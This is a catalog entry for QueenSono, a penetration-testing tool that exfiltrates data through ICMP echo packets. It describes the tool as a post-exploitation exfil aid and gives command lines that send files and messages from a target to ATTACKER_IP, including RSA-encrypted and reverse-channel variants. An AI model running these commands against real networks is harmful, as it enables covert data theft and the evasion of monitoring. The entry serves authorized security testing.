---
name: "queensonos"
categories:
  - networking
homepage: "https://github.com/ariary/QueenSono"
github-repo: "ariary/QueenSono"
github-match: "exact"
origin: "awesome-pentest"
recipe: "upstream"
license: MIT
github-stars: 168
github-pushed: "2026-05-15"
github-commits-year: 17
gh-checked: "2026-11-14"
worth: 5.9
worth-basis: "full (activity+popularity+recency+adoption)"
packaged-by: []
---

# queensonos

> Two-binary ICMP exfiltration pair — `qssender` on the target chunks data into echo requests, `qsreceiver` on your side reassembles it.

## What it's for

QueenSono moves data out of a network through ICMP echo packets, betting (correctly, often) that ICMP is unmonitored or only shallowly inspected — and that captive-portal Wi-Fi lets pings through before authentication. The design constraint is that the target needs nothing but the static `qssender` binary (no Python, no framework), which makes it a post-exploitation exfil tool for locked-down Linux hosts. It supports acknowledged transfer (waits for echo replies), fire-and-forget mode for one-way-filtered targets, RSA encryption so the exchange survives command-line snooping, a reverse mode that pushes data INTO the target via echo replies, and ICMPv6 transparently (auto-detected from the address). Linux-only on both ends; raw-socket capability (`cap_net_raw`, or root) is required.

No corpus evidence — derived from upstream documentation.

## Typical use cases

### Start the listener

```
qsreceiver receive -l 0.0.0.0 -p -f received.txt
```

Outcome: listens on all interfaces for ICMP carrying QueenSono chunks, shows a progress bar, and writes the reassembled data to `received.txt`.

### Exfiltrate a file with acknowledgement

```
qssender send file -d 2 -l 0.0.0.0 -r ATTACKER_IP -s 50000 report.txt
```

Outcome: sends `report.txt` in 50000-byte chunks one every 2 seconds, using echo replies as ACKs (lost chunks are resent); the listener's `received.txt` grows until complete.

### Send a one-shot message without replies

```
qssender send "exfil message" -d 1 -l 0.0.0.0 -r ATTACKER_IP -s 1 -N
```

Outcome: fire-and-forget delivery (`-N` skips waiting for echo replies) for targets whose firewall drops inbound ICMP — pair with `qsreceiver receive truncated 1 -l 0.0.0.0` so the receiver stops after the delay window instead of waiting forever.

### Encrypt the exchange

```
qsreceiver receive -l 0.0.0.0 --encrypt
qssender send "$MSG" -d 1 -l 0.0.0.0 -r ATTACKER_IP -s 5 --key "$KEY"
```

Outcome: the receiver generates an RSA keypair and prints the public key; the sender encrypts with it (`--key`), so an observer watching command lines and packets cannot read the payload. Keep messages short — output size equals the key modulus, and encryption costs CPU.

### Push data back through echo replies

```
qsreceiver reply-send "secret data" -l 0.0.0.0 -d 1
qssender receive -l 0.0.0.0 -r ATTACKER_IP
```

Outcome: reversed channel for targets that can receive pings but not send them — `qssender receive` triggers the listener, which answers with the data packed into echo replies at 1-second intervals. Add `-l ::` / IPv6 `-r` addresses and both directions switch to ICMPv6 automatically.
